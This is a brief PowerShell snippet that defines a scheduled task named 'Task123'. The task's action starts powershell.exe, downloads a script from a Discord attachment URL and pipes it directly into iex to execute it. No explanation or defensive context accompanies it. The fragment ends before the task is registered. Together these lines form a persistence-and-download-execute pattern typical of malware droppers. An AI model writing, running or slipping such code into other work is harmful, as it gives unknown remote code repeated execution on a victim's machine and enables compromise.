$taskName = "Task123"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '/c irm https://cdn.discordapp.com/attachments/415117565098983424/1087433545158500434/Test3.ps1 | iex'
